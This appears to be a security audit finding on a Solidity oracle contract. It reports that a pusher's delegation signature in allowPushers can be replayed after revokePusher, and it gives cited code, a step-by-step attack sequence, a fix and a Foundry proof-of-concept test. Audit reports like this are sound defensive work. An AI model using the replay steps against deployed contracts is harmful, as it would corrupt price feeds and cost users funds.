The vulnerability claim is real. Let me trace through the exact code path.

The vulnerability is confirmed. There is no nonce or used-signature tracking anywhere in the oracle contracts — the grep for `usedSignature`, `nonce`, etc. returns zero hits in the oracle scope. The `allowPushers` signature is purely deadline-gated, and `revokePusher` only zeroes `namespaceRemapping` without invalidating the original signed message.

---

### Title
Signature Replay in `allowPushers` Breaks Pusher-Revocation Finality — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary
`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 signature but tracks no nonce and records no used-signature state. A creator can replay the same valid signature after the pusher has called `revokePusher`, silently re-establishing the delegation and redirecting the pusher's subsequent pushes into the creator's namespace without the pusher's knowledge.

### Finding Description

`allowPushers` signs over `(block.chainid, address(this), deadline, pusher, msg.sender)` and enforces only `block.timestamp <= deadline`: [1](#0-0) 

`revokePusher` zeroes `namespaceRemapping[msg.sender]` but does nothing to the original signed message: [2](#0-1) 

The `fallback` push path resolves the target namespace by reading `namespaceRemapping[msg.sender]` at runtime: [3](#0-2) 

The code's own NatDoc acknowledges the intent: *"the deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [4](#0-3) 

But the implementation only checks `block.timestamp <= deadline` — it does **not** invalidate the signature on revocation. Any non-expired signature is unconditionally replayable.

**Attack sequence (PUSHER_REVOKED_BUT_DEADLINE_VALID_STATE):**

1. Pusher signs `keccak256(abi.encode(chainid, oracle, deadline=now+1 days, pusher, creator))`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator calls `allowPushers` again with the **identical** `(deadline, sig)` pair — deadline still valid, no replay guard → `namespaceRemapping[pusher] = creator` again.
5. Pusher (believing they are now in their own namespace) continues pushing data intended for their own feeds. The `fallback` resolves `namespaceRemapping[pusher] == creator` and writes into `creator << 96 | slotId` — the creator's namespace.

### Impact Explanation

Pools that consume `feedIdOf(creator, slotIndex, positionIndex)` now receive oracle data the pusher intended for a different namespace (their own). If the pusher has switched to pushing prices for different assets after revoking, the creator's feeds are silently corrupted with wrong prices. Any pool swap that reads those feeds executes at a bad price, satisfying the **bad-price execution** impact gate. The pusher has no on-chain visibility that the delegation was re-established.

### Likelihood Explanation

Requires: (a) a creator who re-calls `allowPushers` with the original signature before the deadline expires, and (b) a pusher who continues to push after revoking (a common pattern for automated bots). Deadlines are typically set to hours or days, giving the creator a wide replay window. The creator has a direct financial incentive (keeping their pool's oracle fed) to perform the replay.

### Recommendation

Track consumed signatures. Add a `mapping(bytes32 => bool) private _usedDelegationSigs` and set it to `true` on first use in `allowPushers`. Alternatively, introduce a per-pusher nonce (`mapping(address => uint256) public pusherNonce`) that the pusher increments on revocation, and include it in the signed payload so any pre-revocation signature becomes immediately invalid.

```solidity
// in allowPushers, after ECDSA.recover succeeds:
bytes32 sigKey = keccak256(signatures[i]);
require(!_usedDelegationSigs[sigKey], SignatureAlreadyUsed());
_usedDelegationSigs[sigKey] = true;
```

Or, on `revokePusher`, increment `pusherNonce[msg.sender]` and require the nonce to be embedded in the signed message.

### Proof of Concept

```solidity
// Foundry unit test sketch
function test_revocationReplay() public {
    uint256 deadline = block.timestamp + 1 days;

    // pusher signs consent for creator
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(pusherKey, hash);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: creator delegates pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 2: pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 3: creator replays the same signature
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);  // no revert — replay succeeds
    assertEq(oracle.namespaceRemapping(pusher), creator); // revocation undone

    // Step 4: pusher pushes (thinking it's their own namespace)
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(buildSlotWord(slotId, price, ts));
    assertTrue(ok);

    // Data lands in creator's namespace, not pusher's
    bytes32 creatorFeed = oracle.feedIdOf(creator, slotId, 0);
    IOffchainOracle.OracleData memory data = oracle.getOracleData(creatorFeed);
    assertGt(data.price, 0); // creator's feed is populated with pusher's data
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-211)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
